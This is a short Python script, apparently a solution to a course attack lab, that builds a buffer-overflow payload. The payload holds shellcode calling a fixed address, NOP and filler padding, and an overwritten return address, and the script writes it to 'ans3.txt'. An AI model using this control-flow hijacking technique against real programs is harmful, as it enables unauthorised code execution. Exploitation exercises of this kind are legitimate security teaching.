
shellcode = bytes([
    0xbf, 0x72, 0x00, 0x00, 0x00,        # mov    $0x72,%edi
    0x48, 0xc7, 0xc0, 0x16, 0x12, 0x40, 0x00,  # mov    $0x401216,%rax
    0xff, 0xd0,                          # call   *%rax
    0xc3                                 # ret
])

payload = b""


payload += shellcode


if len(payload) < 0x20:
    payload += b"\x90" * (0x20 - len(payload))


payload += b"B" * 8

jmp_xs = 0x401334
payload += jmp_xs.to_bytes(8, "little")

if len(payload) < 0x40:
    payload += b"C" * (0x40 - len(payload))

print("payload length:", len(payload))

with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans3.txt")

